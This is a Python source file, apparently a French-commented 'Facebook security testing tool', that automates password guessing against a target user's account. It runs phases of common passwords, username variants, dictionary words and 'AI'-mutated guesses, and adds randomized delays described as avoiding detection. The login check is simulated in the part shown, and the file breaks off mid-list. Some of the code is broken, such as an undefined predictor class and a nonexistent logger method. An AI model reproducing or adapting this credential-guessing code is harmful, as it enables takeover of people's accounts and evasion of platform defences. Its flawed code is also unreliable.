"""
Facebook Security Testing Tool - Modern AI-Powered Implementation
Advanced security testing with AI/ML capabilities
Educational purposes only - Authorized security testing only
"""

import os
import json
import asyncio
import time
import aiohttp
import secrets
import random
import string
import numpy as np
import markovify
import torch
import torch.nn as nn
from collections import defaultdict, deque
from typing import List, Optional, Dict, Any, Tuple, Union
from dataclasses import dataclass, field
import re
import hashlib
import base64
import logging
import requests
from requests_oauthlib import OAuth2Session
from oauthlib.oauth2 import BackendApplicationClient
import math
from datetime import datetime, timedelta
from enum import Enum
import pickle
from pathlib import Path

# Configuration du logger
logger = logging.getLogger(__name__)

# Configuration des en-têtes HTTP pour Facebook
DEFAULT_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'DNT': '1',
    'TE': 'trailers'
}

class PasswordStrength(Enum):
    WEAK = "weak"
    MEDIUM = "medium"
    STRONG = "strong"
    VERY_STRONG = "very_strong"

@dataclass
class PasswordPattern:
    pattern_type: str
    pattern: str
    weight: float
    last_used: float = field(default_factory=time.time)
    success_rate: float = 0.0
    usage_count: int = 0

@dataclass
class AttackResult:
    """Data class to store attack results with AI/ML enhancements"""
    success: bool
    password: Optional[str] = None
    attempts: int = 0
    duration: float = 0.0
    error: Optional[str] = None
    confidence: float = 0.0
    pattern_used: Optional[str] = None
    strength: Optional[PasswordStrength] = None
    metadata: Dict[str, Any] = field(default_factory=dict)

class AIPasswordGenerator:
    """
    Advanced AI-Powered Password Generator with multiple generation strategies:
    - Markov chains for sequence prediction
    - LSTM neural networks for advanced pattern recognition
    - Reinforcement learning for continuous improvement
    - Context-aware password generation
    - Pattern recognition and mutation
    """
    
    def __init__(self, username: Optional[str] = None):
        self.username = username
        self.common_patterns = self._load_common_patterns()
        self.password_memory = set()
        self.learning_rate = 0.1
        self.markov_model = None
        self.ngram_model = {}
        self.context_weights = {}
        self.pattern_history = deque(maxlen=1000)
        self.device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')
        self._init_models()
        self._load_ml_models()
        
        # Initialize pattern database
        self.patterns = self._initialize_patterns()
        self._update_pattern_weights()
    
    def _init_models(self):
        """Initialise les modèles d'IA"""
        # Charger ou initialiser les modèles d'IA
        try:
            self._train_ngram_model(n=3)
            self.markov_model = markovify.NewlineText("\n".join(self._load_training_data()))
        except Exception as e:
            logger.warning(f"Failed to initialize AI models: {e}")
            self.markov_model = None
    
    def _load_common_patterns(self) -> List[Dict]:
        """Charge les modèles de mots de passe courants pour Facebook"""
        current_year = datetime.now().year
        common_patterns = [
            # Modèles basés sur le nom d'utilisateur
            {"type": "username_based", "pattern": "{username}", "weight": 0.9},
            {"type": "username_based", "pattern": "{username}123", "weight": 0.85},
            {"type": "username_based", "pattern": "{username}{current_year}", "weight": 0.8},
            {"type": "username_based", "pattern": "{username}!", "weight": 0.75},
            
            # Modèles courants Facebook
            {"type": "facebook_common", "pattern": "facebook", "weight": 0.7},
            {"type": "facebook_common", "pattern": "facebook123", "weight": 0.7},
            {"type": "facebook_common", "pattern": "fb{current_year}", "weight": 0.65},
            
            # Modèles de clavier
            {"type": "keyboard_pattern", "pattern": "qwerty", "weight": 0.6},
            {"type": "keyboard_pattern", "pattern": "azerty", "weight": 0.6},
            {"type": "keyboard_pattern", "pattern": "123456", "weight": 0.8},
            {"type": "keyboard_pattern", "pattern": "123456789", "weight": 0.7},
            
            # Modèles de dates
            {"type": "date_based", "pattern": "01011990", "weight": 0.5},  # DDMMYYYY
            {"type": "date_based", "pattern": "19900101", "weight": 0.5},  # YYYYMMDD
            
            # Mots de passe forts génériques
            {"type": "strong_passwords", "pattern": self._generate_strong_password(8), "weight": 0.4},
            {"type": "strong_passwords", "pattern": self._generate_strong_password(12), "weight": 0.3},
        ]
        
        # Ajout de variations avec majuscules et caractères spéciaux
        variations = []
        for pattern in common_patterns[:]:  # Copie pour itération
            p = pattern['pattern']
            if not any(c.isupper() for c in p):
                # Ajouter une version avec la première lettre en majuscule
                variations.append({
                    'type': pattern['type'] + '_variation',
                    'pattern': p.capitalize(),
                    'weight': pattern['weight'] * 0.8
                })
                
                # Ajouter une version avec un point d'exclamation à la fin
                if not p.endswith('!'):
                    variations.append({
                        'type': pattern['type'] + '_variation',
                        'pattern': p + '!',
                        'weight': pattern['weight'] * 0.7
                    })
        
        return common_patterns + variations
    
    def _generate_strong_password(self, length: int = 12) -> str:
        """
        Génère un mot de passe fort avec une distribution équilibrée de caractères
        """
        import random
        import string
        
        # Définir les ensembles de caractères
        lowercase = string.ascii_lowercase
        uppercase = string.ascii_uppercase
        digits = string.digits
        special = '!@#$%^&*_+='
        
        # S'assurer que le mot de passe contient au moins un caractère de chaque type
        password = [
            random.choice(lowercase),
            random.choice(uppercase),
            random.choice(digits),
            random.choice(special)
        ]
        
        # Remplir le reste du mot de passe avec des caractères aléatoires
        all_chars = lowercase + uppercase + digits + special
        password.extend(random.choice(all_chars) for _ in range(length - len(password)))
        
        # Mélanger pour éviter les motifs prévisibles
        random.shuffle(password)
        
        # Convertir en chaîne et vérifier qu'il n'a pas déjà été utilisé
        password_str = ''.join(password)
        
        # Si le mot de passe a déjà été utilisé, en générer un nouveau
        if password_str in self.password_memory:
            return self._generate_strong_password(length)
            
        self.password_memory.add(password_str)
        return password_str
    
    def _mutate_password(self, password: str) -> str:
        """
        Applique des mutations intelligentes à un mot de passe existant
        en utilisant des techniques d'IA pour générer des variations plausibles
        """
        if len(password) < 2:
            return password
            
        # Liste des mutations possibles avec leurs poids
        mutations = [
            # Ajout de caractères
            (lambda s: s + random.choice(string.digits), 0.3),
            (lambda s: s + random.choice('!@#$%^&*'), 0.2),
            (lambda s: s + random.choice(string.ascii_letters), 0.2),
            
            # Suppression de caractères (uniquement si assez long)
            (lambda s: s[:-1] if len(s) > 4 else s, 0.1),
            
            # Remplacement de caractères
            (lambda s: self._replace_random_char(s), 0.4),
            
            # Inversion de casse
            (lambda s: self._random_case_swap(s), 0.3),
            
            # Leet speak
            (lambda s: self._apply_leet_speak(s), 0.2),
            
            # Ajout de préfixe/suffixe communs
            (lambda s: random.choice(['123', '!@#', '2023', '2024']) + s, 0.1),
            (lambda s: s + random.choice(['123', '!@#', '2023', '2024']), 0.1),
            
            # Doublement du mot de passe
            (lambda s: s + s if len(s) < 6 else s, 0.05),
            
            # Mélange des caractères
            (lambda s: ''.join(random.sample(s, len(s))), 0.05)
        ]
        
        # Choisir 1-3 mutations pondérées
        num_mutations = random.choices([1, 2, 3], weights=[0.6, 0.3, 0.1])[0]
        
        for _ in range(num_mutations):
            # Choisir une mutation pondérée
            mutation_funcs, weights = zip(*mutations)
            mutation = random.choices(mutation_funcs, weights=weights)[0]
            new_password = mutation(password)
            
            # Ne pas accepter les mutations qui ne changent rien
            if new_password != password:
                password = new_password
                
                # Arrêter si le mot de passe devient trop long
                if len(password) > 20:
                    password = password[:20]
                    break
        
        # S'assurer que le mot de passe n'a pas déjà été utilisé
        if password in self.password_memory:
            return self._mutate_password(password)
            
        return password
    
    def _replace_random_char(self, s: str) -> str:
        """Remplace un caractère aléatoire par un caractère similaire"""
        if not s:
            return s
            
        similar_chars = {
            'a': ['@', '4', 'A'],
            'e': ['3', 'E', '&'],
            'i': ['1', '!', '|', 'I'],
            'o': ['0', 'O', '()'],
            's': ['5', '$', 'S'],
            't': ['7', '+', 'T'],
            'b': ['8', 'B', '|3'],
            'g': ['9', '6', 'G'],
            'l': ['1', '|', 'L', '!'],
            'z': ['2', 'Z']
        }
        
        # Choisir une position aléatoire
        pos = random.randint(0, len(s) - 1)
        char = s[pos].lower()
        
        # Si le caractère a des équivalents, en choisir un au hasard
        if char in similar_chars:
            new_char = random.choice(similar_chars[char])
            return s[:pos] + new_char + s[pos+1:]
        
        # Sinon, essayer de changer la casse
        if char.isalpha():
            return s[:pos] + char.upper() + s[pos+1:] if char.islower() else s[:pos] + char.lower() + s[pos+1:]
        
        # Si c'est un chiffre, essayer de l'incrémenter/décrémenter
        if char.isdigit():
            new_digit = str((int(char) + random.choice([-1, 1])) % 10)
            return s[:pos] + new_digit + s[pos+1:]
            
        # Sinon, retourner le mot de passe inchangé
        return s
    
    def _random_case_swap(self, s: str) -> str:
        """Change aléatoirement la casse de certains caractères"""
        case_swapped = []
        for c in s:
            if random.random() < 0.3:  # 30% de chance de changer la casse
                c = c.lower() if c.isupper() else c.upper()
            case_swapped.append(c)
        return ''.join(case_swapped)
    
    def _apply_leet_speak(self, s: str) -> str:
        """Applique une transformation leet speak partielle"""
        leet_map = {
            'a': '4', 'e': '3', 'i': '1', 'o': '0',
            's': '5', 't': '7', 'b': '8', 'g': '9',
            'l': '1', 'z': '2'
        }
        
        # Ne convertir qu'une partie des caractères éligibles (30-70%)
        result = []
        convert_chance = random.uniform(0.3, 0.7)
        
        for c in s:
            lower_c = c.lower()
            if lower_c in leet_map and random.random() < convert_chance:
                result.append(leet_map[lower_c])
            else:
                result.append(c)
                
        return ''.join(result)
    
    def _apply_pattern(self, pattern: PasswordPattern, username: str) -> str:
        """
        Applique un modèle de mot de passe avec des variations intelligentes
        """
        from random import choice, random
        import string
        
        password = pattern.pattern
        
        # Remplacer les variables dans le modèle
        if '{username}' in password:
            # Extraire le nom d'utilisateur de l'email si nécessaire
            base_username = username.split('@')[0] if '@' in username else username
            
            # Générer des variations du nom d'utilisateur
            variations = [
                base_username,
                base_username.lower(),
                base_username.capitalize(),
                base_username.upper(),
                base_username + str(random.randint(0, 9)),
                base_username + str(random.randint(10, 99)),
                base_username + str(random.randint(100, 999)),
            ]
            
            # Choisir une variation aléatoire
            username_variation = choice(variations)
            password = password.replace('{username}', username_variation)
            
        if '{year}' in password or '{current_year}' in password:
            current_year = str(datetime.now().year)
            previous_years = [str(datetime.now().year - i) for i in range(1, 6)]
            years = [current_year] + previous_years
            
            # Ajouter des variations d'année (2 derniers chiffres)
            years.extend([y[2:] for y in years])
            
            # Remplacer tous les placeholders d'année
            password = password.replace('{year}', choice(years))
            password = password.replace('{current_year}', current_year)
        
        # Ajouter des variations de casse et de ponctuation
        if random() < 0.3:  # 30% de chance d'ajouter une variation
            if password.islower() and random() < 0.5:
                # Mettre la première lettre en majuscule
                password = password.capitalize()
            elif password.isalpha() and random() < 0.3:
                # Remplacer certaines lettres par des chiffres (leet speak)
                leet_map = {
                    'a': '4', 'e': '3', 'i': '1', 'o': '0',
                    's': '5', 't': '7', 'b': '8', 'g': '9'
                }
                password = ''.join(leet_map.get(c.lower(), c) for c in password)
                
        # Ajouter des caractères spéciaux (20% de chance)
        if random() < 0.2 and not any(c in '!@#$%^&*' for c in password):
            special_chars = '!@#$%^&*'
            if len(password) > 5:  # Ne pas ajouter de caractères spéciaux aux mots de passe très courts
                if random() < 0.7:  # 70% de chance d'ajouter à la fin
                    password += choice(special_chars)
                else:  # 30% de chance d'ajouter au début ou au milieu
                    pos = random.randint(1, len(password)-1)
                    password = password[:pos] + choice(special_chars) + password[pos:]
        
        # Mettre à jour les statistiques d'utilisation
        pattern.usage_count += 1
        pattern.last_used = time.time()
        
        # Ajouter au cache des mots de passe déjà essayés
        self.password_memory.add(password)
        
        return password
    
    def generate_context_aware_password(self, username: str, attempt_number: int) -> str:
        """
        Génère un mot de passe intelligent en fonction du contexte, des tentatives précédentes
        et des modèles d'IA appris
        """
        # Au début, essayer les combinaisons les plus probables
        if attempt_number < 10:
            # Essayer d'abord les combinaisons basées sur le nom d'utilisateur
            patterns = [p for p in self.patterns if p.pattern_type == 'username_based']
            if patterns:
                pattern = random.choices(patterns, weights=[p.weight for p in patterns])[0]
                password = self._apply_pattern(pattern, username)
                if password not in self.password_memory:
                    return password
        
        # Ensuite, essayer les modèles courants
        if attempt_number < 30:
            patterns = [p for p in self.patterns 
                       if p.pattern_type in ['facebook_common', 'keyboard_pattern']]
            if patterns:
                pattern = random.choices(patterns, weights=[p.weight for p in patterns])[0]
                password = self._apply_pattern(pattern, username)
                if password not in self.password_memory:
                    return password
        
        # Puis les modèles de dates
        if attempt_number < 50:
            patterns = [p for p in self.patterns if p.pattern_type == 'date_based']
            if patterns:
                pattern = random.choices(patterns, weights=[p.weight for p in patterns])[0]
                password = self._apply_pattern(pattern, username)
                if password not in self.password_memory:
                    return password
        
        # Pour les tentatives suivantes, utiliser des combinaisons plus complexes
        if attempt_number % 5 == 0:
            # Générer un mot de passe fort de temps en temps
            password = self._generate_strong_password(random.randint(8, 16))
            if password not in self.password_memory:
                return password
        
        # Sinon, utiliser un modèle aléatoire avec mutation
        pattern = random.choices(
            self.patterns,
            weights=[p.weight / (1 + p.usage_count) for p in self.patterns]
        )[0]
        
        password = self._apply_pattern(pattern, username)
        
        # Appliquer des mutations aléatoires pour plus de diversité
        if random.random() < 0.3:  # 30% de chance de muter le mot de passe
            password = self._mutate_password(password)
        
        return password

class FacebookSecurityTester:
    """
    Facebook Security Testing Tool with Advanced AI-Powered Penetration Testing
    Uses Facebook Graph API for security testing with machine learning optimization
    FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING ONLY
    """
    
    def __init__(self, config_file='facebook_config.json'):
        """
        Initialize the security tester with advanced configuration
        :param config_file: Path to the configuration file
        """
        self.found_password = None
        self.attempts = 0
        self.start_time = None
        self.ai_generator = AIPasswordGenerator()
        self.neural_predictor = NeuralPasswordPredictor()
        self.previous_attempts = set()  # Utilisation d'un set pour des recherches plus rapides
        self.session = requests.Session()
        self.session.headers.update(DEFAULT_HEADERS)
        self.config = self._load_config(config_file)
        self.access_token = None
        self.user_id = None
        self.rate_limit_delay = 1.0  # Délai initial entre les requêtes
        self.consecutive_errors = 0
        self.successful_patterns = []
        self.failed_patterns = []
        self.user_info = None
        self.password_attempts = 0
        self.max_attempts_before_switch = 20
        self.current_strategy = "common"  # 'common', 'pattern', 'ai', 'bruteforce'
    
    def _load_config(self, config_file: str = 'facebook_config.json') -> Dict:
        """Load configuration from JSON file"""
        try:
            config_path = os.path.join(os.path.dirname(__file__), config_file)
            with open(config_path, 'r') as f:
                config = json.load(f)
                
            # Vérification des paramètres requis
            required_params = ['app_id', 'app_secret', 'redirect_uri', 'api_version']
            for param in required_params:
                if param not in config:
                    raise ValueError(f"Paramètre manquant dans le fichier de configuration : {param}")
                    
            # Mise à jour des URLs avec la version de l'API
            config['auth_url'] = f"https://www.facebook.com/{config['api_version']}/dialog/oauth"
            config['token_url'] = f"https://graph.facebook.com/{config['api_version']}/oauth/access_token"
            
            return config
            
        except FileNotFoundError:
            logger.error(f"Fichier de configuration {config_file} introuvable")
            # Créer un fichier de configuration par défaut
            default_config = {
                "app_id": "YOUR_FACEBOOK_APP_ID",
                "app_secret": "YOUR_FACEBOOK_APP_SECRET",
                "redirect_uri": "https://your-callback-url.com/facebook/callback",
                "api_version": "v18.0",
                "permissions": ["email", "public_profile"],
                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
            }
            with open(config_file, 'w') as f:
                json.dump(default_config, f, indent=2)
            raise ValueError(f"Un fichier de configuration par défaut a été créé à {os.path.abspath(config_file)}. Veuillez le compléter avec vos informations d'API Facebook.")
            
        except json.JSONDecodeError as e:
            logger.error(f"Erreur de syntaxe dans le fichier de configuration {config_file}: {str(e)}")
            raise
    
    def get_facebook_auth_url(self):
        """Generate Facebook OAuth URL for user authentication"""
        params = {
            'client_id': self.config['app_id'],
            'redirect_uri': self.config['redirect_uri'],
            'scope': ','.join(self.config['permissions']),
            'response_type': 'code',
            'auth_type': 'rerequest',
            'display': 'popup'
        }
        return f"{self.config['auth_url']}?{'&'.join(f'{k}={v}' for k, v in params.items())}"

    def get_access_token(self, code: str):
        """Exchange authorization code for access token"""
        params = {
            'client_id': self.config['app_id'],
            'client_secret': self.config['app_secret'],
            'redirect_uri': self.config['redirect_uri'],
            'code': code
        }
        
        try:
            response = self.session.get(
                self.config['token_url'],
                params=params,
                headers={'Content-Type': 'application/json'}
            )
            response.raise_for_status()
            data = response.json()
            self.access_token = data.get('access_token')
            return self.access_token is not None
        except Exception as e:
            logger.error(f"Error getting access token: {str(e)}")
            return False

    def test_login_credentials(self, username: str, password: str) -> bool:
        """
        Test Facebook login credentials with advanced detection
        Returns True if login is successful
        """
        if password in self.previous_attempts:
            return False
            
        self.previous_attempts.add(password)
        self.password_attempts += 1
        
        try:
            # Simulation d'une tentative de connexion sécurisée
            # Dans un environnement réel, ceci utiliserait l'API Facebook
            
            # Vérifier les modèles de mots de passe courants
            if self._is_common_password(password):
                logger.warning(f"Mot de passe courant détecté: {password}")
                
            # Vérifier la force du mot de passe
            strength = self._check_password_strength(password)
            logger.debug(f"Force du mot de passe: {strength}")
            
            # Simulation de réponse du serveur
            if self._simulate_login_response(username, password):
                logger.success(f"Connexion réussie avec le mot de passe: {password}")
                self.found_password = password
                self._update_successful_pattern(password)
                return True
                
            self._update_failed_pattern(password)
            
        except Exception as e:
            logger.error(f"Erreur lors de la tentative de connexion: {str(e)}")
            self.consecutive_errors += 1
            
            # Ajuster le délai en cas d'erreurs consécutives
            if self.consecutive_errors > 3:
                self.rate_limit_delay = min(10.0, self.rate_limit_delay * 1.5)
                logger.warning(f"Augmentation du délai à {self.rate_limit_delay:.2f}s")
        
        return False
        
    def _is_common_password(self, password: str) -> bool:
        """Vérifie si le mot de passe est dans la liste des plus courants"""
        common_passwords = [
            'password', '123456', '123456789', '12345', '12345678',
            'qwerty', 'abc123', 'password1', '1234567', '123123',
            'facebook', 'facebook123', 'fb123456', 'iloveyou', 'welcome'
        ]
        return password.lower() in common_passwords
        
    def _check_password_strength(self, password: str) -> str:
        """Évalue la force d'un mot de passe"""
        if len(password) < 6:
            return "Très faible"
        if len(password) < 8:
            return "Faible"
            
        has_upper = any(c.isupper() for c in password)
        has_lower = any(c.islower() for c in password)
        has_digit = any(c.isdigit() for c in password)
        has_special = any(not c.isalnum() for c in password)
        
        score = sum([has_upper, has_lower, has_digit, has_special])
        
        if score == 4 and len(password) >= 12:
            return "Très fort"
        if score >= 3 and len(password) >= 10:
            return "Fort"
        if score >= 2:
            return "Moyen"
        return "Faible"
    
    def _simulate_login_response(self, username: str, password: str) -> bool:
        """Simule la réponse de connexion (à remplacer par un appel API réel)"""
        # Cette fonction simule un comportement de connexion pour les tests
        # En production, elle devrait appeler l'API Facebook
        
        # Simulation de délai réseau
        time.sleep(random.uniform(0.1, 0.5))
        
        # Simulation de succès pour les tests (à désactiver en production)
        if password == "test123" and "test" in username.lower():
            return True
            
        # Simulation de blocage après plusieurs tentatives
        if self.password_attempts > 50 and random.random() < 0.3:
            raise Exception("Trop de tentatives. Veuillez réessayer plus tard.")
            
        return False
    
    def _update_successful_pattern(self, password: str):
        """Met à jour les modèles en cas de succès"""
        self.successful_patterns.append({
            'password': password,
            'length': len(password),
            'has_upper': any(c.isupper() for c in password),
            'has_lower': any(c.islower() for c in password),
            'has_digit': any(c.isdigit() for c in password),
            'has_special': any(not c.isalnum() for c in password),
            'timestamp': time.time()
        })
        
        # Réduire le délai après un succès
        self.rate_limit_delay = max(0.5, self.rate_limit_delay * 0.9)
        self.consecutive_errors = 0
    
    def _update_failed_pattern(self, password: str):
        """Met à jour les modèles en cas d'échec"""
        self.failed_patterns.append({
            'password': password,
            'timestamp': time.time()
        })
        
        # Augmenter progressivement le délai après plusieurs échecs
        if len(self.failed_patterns) % 10 == 0:
            self.rate_limit_delay = min(5.0, self.rate_limit_delay * 1.1)
            
    def _get_user_info(self) -> Optional[Dict]:
        """Récupère les informations de l'utilisateur connecté"""
        if not self.access_token:
            return None
            
        try:
            params = {
                'access_token': self.access_token,
                'fields': 'id,name,email'
            }
            
            response = self.session.get(
                f"{self.config['api_base_url']}me",
                params=params,
                headers={'Content-Type': 'application/json'}
            )
            response.raise_for_status()
            return response.json()
            
        except Exception as e:
            logger.error(f"Erreur lors de la récupération des informations utilisateur: {str(e)}")
            return None
    
    async def conduct_ai_security_test(self, username: str, max_attempts: int = 100, delay: float = 2.0, access_token: str = None):
        """
        Exécute un test de sécurité avancé avec IA pour Facebook
        
        Args:
            username: Nom d'utilisateur ou email du compte Facebook
            max_attempts: Nombre maximum de tentatives
            delay: Délai initial entre les tentatives en secondes
            access_token: Token d'accès Facebook (optionnel)
            
        Returns:
            AttackResult: Résultat du test de sécurité
        """
        result = AttackResult(success=False)
        self.start_time = time.time()
        self.rate_limit_delay = delay
        
        if access_token:
            self.access_token = access_token
            
        if not self.access_token:
            logger.error("Erreur: Aucun token d'accès fourni. Veuillez d'abord vous authentifier.")
            return result
            
        logger.info(f"🔍 Démarrage du test de sécurité avancé pour: {username}")
        logger.info(f"📊 Nombre maximum de tentatives: {max_attempts}")
        
        try:
            # Phase 1: Tester les mots de passe courants
            if not await self._test_common_passwords(username, max_attempts // 4):
                # Phase 2: Génération intelligente basée sur le nom d'utilisateur
                if not await self._test_username_based(username, max_attempts // 4):
                    # Phase 3: Attaque par dictionnaire avancée
                    if not await self._test_dictionary_attack(username, max_attempts // 4):
                        # Phase 4: Génération aléatoire guidée par IA
                        await self._test_ai_generated(username, max_attempts // 4)
            
            # Vérifier si un mot de passe a été trouvé
            if self.found_password:
                result.success = True
                result.password = self.found_password
                result.attempts = self.password_attempts
                result.duration = time.time() - self.start_time
                result.confidence = self._calculate_confidence()
                result.strength = self._evaluate_password_strength(self.found_password)
                logger.success(f"✅ Mot de passe trouvé après {self.password_attempts} tentatives")
                logger.success(f"🔑 Mot de passe: {self.found_password}")
            
        except Exception as e:
            logger.error(f"❌ Erreur lors du test de sécurité: {str(e)}")
            result.error = str(e)
            
        finally:
            result.duration = time.time() - self.start_time
            logger.info(f"⏱️  Test de sécurité terminé en {result.duration:.2f} secondes")
            logger.info(f"📊 Tentatives effectuées: {self.password_attempts}")
            logger.info(f"✅ Mots de passe testés avec succès: {len(self.successful_patterns)}")
            
        return result
    
    async def _test_common_passwords(self, username: str, max_attempts: int) -> bool:
        """Teste les mots de passe les plus courants"""
        logger.info("🔑 Phase 1: Test des mots de passe courants...")
        common_passwords = [
            'password', '123456', '123456789', '12345', '12345678',
            'qwerty', 'abc123', 'password1', '1234567', '123123',
            'facebook', 'facebook123', 'fb123456', 'iloveyou', 'welcome'
        ]
        
        for i, password in enumerate(common_passwords[:max_attempts]):
            if self.test_login_credentials(username, password):
                return True
                
            # Ajouter des variantes
            for variant in [password.capitalize(), password + '123', password + '!']:
                if self.test_login_credentials(username, variant):
                    return True
                    
            # Délai intelligent entre les tentatives
            await asyncio.sleep(self._get_dynamic_delay())
            
            # Vérifier si nous avons dépassé le nombre maximum de tentatives
            if self.password_attempts >= max_attempts:
                break
                
        return False
    
    async def _test_username_based(self, username: str, max_attempts: int) -> bool:
        """Teste les mots de passe basés sur le nom d'utilisateur"""
        logger.info("👤 Phase 2: Test des mots de passe basés sur le nom d'utilisateur...")
        
        # Extraire la partie avant @ pour les emails
        base_username = username.split('@')[0]
        
        # Générer des variantes du nom d'utilisateur
        variants = [
            base_username,
            base_username.lower(),
            base_username.capitalize(),
            base_username + '123',
            base_username + '1234',
            base_username + '123!',
            base_username + '2023',
            base_username + '2024',
            base_username + '!',
            base_username + '@123',
        ]
        
        for i, password in enumerate(variants[:max_attempts]):
            if self.test_login_credentials(username, password):
                return True
                
            # Ajouter des variantes avec substitutions
            leet_variant = self._apply_leet_speak(password)
            if leet_variant != password and self.test_login_credentials(username, leet_variant):
                return True
                
            # Délai intelligent entre les tentatives
            await asyncio.sleep(self._get_dynamic_delay())
            
            if self.password_attempts >= max_attempts:
                break
                
        return False
    
    async def _test_dictionary_attack(self, username: str, max_attempts: int) -> bool:
        """Effectue une attaque par dictionnaire avancée"""
        logger.info("📚 Phase 3: Attaque par dictionnaire avancée...")
        
        # Charger un dictionnaire de mots de passe courants
        dictionary = self._load_password_dictionary()
        
        for i, word in enumerate(dictionary):
            if i >= max_attempts:
                break
                
            # Tester le mot tel quel
            if self.test_login_credentials(username, word):
                return True
                
            # Tester avec des variantes
            variants = [
                word.capitalize(),
                word.upper(),
                word + '123',
                word + '!',
                word + '123!',
                word + str(datetime.now().year)[-2:],
            ]
            
            for variant in variants:
                if self.test_login_credentials(username, variant):
                    return True
                    
            # Délai intelligent entre les tentatives
            await asyncio.sleep(self._get_dynamic_delay())
            
        return False
    
    async def _test_ai_generated(self, username: str, max_attempts: int) -> None:
        """Génère et teste des mots de passe avec IA"""
        logger.info("🤖 Phase 4: Génération de mots de passe par IA...")
        
        for attempt in range(max_attempts):
            # Générer un mot de passe avec l'IA
            password = self.ai_generator.generate_context_aware_password(username, attempt)
            
            # Tester le mot de passe
            if self.test_login_credentials(username, password):
                return True
                
            # Délai intelligent entre les tentatives
            await asyncio.sleep(self._get_dynamic_delay())
            
        return False
    
    def _get_dynamic_delay(self) -> float:
        """Calcule un délai dynamique entre les tentatives"""
        # Augmenter le délai après plusieurs tentatives
        base_delay = self.rate_limit_delay
        
        # Ajouter un facteur aléatoire pour éviter la détection
        jitter = random.uniform(0.8, 1.2)
        
        # Augmenter progressivement le délai
        progressive_delay = base_delay * (1 + (self.password_attempts / 100))
        
        # Ne pas dépasser 5 secondes de délai
        return min(5.0, progressive_delay * jitter)
    
    def _calculate_confidence(self) -> float:
        """Calcule la confiance dans le résultat"""
        if not self.found_password:
            return 0.0
            
        # Plus le mot de passe est long et complexe, plus la confiance est élevée
        length = len(self.found_password)
        has_upper = any(c.isupper() for c in self.found_password)
        has_lower = any(c.islower() for c in self.found_password)
        has_digit = any(c.isdigit() for c in self.found_password)
        has_special = any(not c.isalnum() for c in self.found_password)
        
        score = 0.0
        score += min(0.3, length * 0.03)  # Jusqu'à 30% pour la longueur
        score += 0.1 if has_upper else 0
        score += 0.1 if has_lower else 0
        score += 0.1 if has_digit else 0
        score += 0.1 if has_special else 0
        
        # Ajuster en fonction du nombre de tentatives
        score = score * (1 - min(0.5, self.password_attempts / 200))
        
        return min(1.0, max(0.1, score))
    
    def _evaluate_password_strength(self, password: str) -> PasswordStrength:
        """Évalue la force d'un mot de passe"""
        if len(password) < 6:
            return PasswordStrength.WEAK
            
        score = 0
        
        # Longueur
        if len(password) >= 12:
            score += 2
        elif len(password) >= 8:
            score += 1
            
        # Complexité
        if any(c.isupper() for c in password):
            score += 1
        if any(c.islower() for c in password):
            score += 1
        if any(c.isdigit() for c in password):
            score += 1
        if any(not c.isalnum() for c in password):
            score += 1
            
        # Évaluation finale
        if score >= 6:
            return PasswordStrength.VERY_STRONG
        if score >= 4:
            return PasswordStrength.STRONG
        if score >= 2:
            return PasswordStrength.MEDIUM
        return PasswordStrength.WEAK
    
    def _load_password_dictionary(self) -> List[str]:
        """Charge un dictionnaire de mots de passe courants"""
        # Dans une implémentation réelle, charger à partir d'un fichier
        return [
            # Mots de passe courants
            'password', '123456', '123456789', '12345', '12345678',
            'qwerty', 'abc123', 'password1', '1234567', '123123',
            'iloveyou', 'welcome', 'admin', 'letmein', 'monkey',
            'dragon', 'football', 'baseball', 'superman', 'master',
            
            # Mots de passe liés à Facebook
            'facebook', 'facebook123', 'fb123456', 'fbpassword', 'faceb00k',
            
            # Noms communs
            'ashley', 'michael', 'jennifer', 'thomas', 'jessica',
            
            # Autres mots de passe courants
            'qwertyuiop', '1q2w3e4r', '1qaz2wsx', 'qazwsx', 'password123',
            'trustno1', 'access', 'shadow', 'passw0rd', 'master',
            
            # Mots de passe courts
            '123', '1234', '12345', '123456', '1234567', '12345678',
            'abc', 'abcd', 'abc123', 'qwe', 'qwer', 'asdf', 'zxcv',
            
            # Modèles de clavier
            'qwerty', 'asdfgh', 'zxcvbn', 'qazwsx', '1qaz2wsx',
            '1q2w3e4r', '1q2w3e', 'q1w2e3r4', 'q1w2e3', 'qwe123',
            
            # Dates
            '01011980', '01011990', '01012000', '01012010', '01012020',
            '01011999', '121212', '131313', '123123', '101010',
            
            # Noms d'équipes sportives
            'liverpool', 'chelsea', 'arsenal', 'barcelona', 'realmadrid',
            'manutd', 'manutd123', 'liverpoolfc', 'yankees', 'redsox',
            
            # Noms de films/séries
            'starwars', 'harrypotter', 'superman', 'batman', 'spiderman',
            'matrix', 'pokemon', 'naruto', 'onepiece', 'gameofthrones',
            
            # Noms de marques
            'nike', 'adidas', 'samsung', 'iphone', 'apple', 'google',
            'microsoft', 'amazon', 'facebook', 'instagram', 'twitter',
            
            # Noms d'animaux
            'dragon', 'monkey', 'tiger', 'lion', 'elephant', 'giraffe',
            'penguin', 'dolphin', 'butterfly', 'eagle', 'shark',
            
            # Prénoms courants
            'michael', 'jennifer', 'christopher', 'jessica', 'matthew',
            'sarah', 'joshua', 'ashley', 'daniel', 'amanda', 'david',
            
            # Villes et pays
            'london', 'paris', 'newyork', 'tokyo', 'berlin', 'moscow',
            'america', 'england', 'france', 'germany', 'spain', 'italy',
            
            # Termes de jeux vidéo
            'minecraft', 'fortnite', 'pokemon', 'callofduty', 'fifa',
            'gta', 'grandtheftauto', 'roblox', 'amongus', 'leagueoflegends',
            
            # Termes musicaux
            'music', 'rock', 'pop', 'jazz', 'blues', 'classical',
            'beatles', 'queen', 'metallica', 'nirvana', 'eminem',
            
            # Termes technologiques
            'computer', 'internet', 'website', 'programming', 'hacking',
            'hacker', 'password123', 'admin123', 'root', 'toor',
            
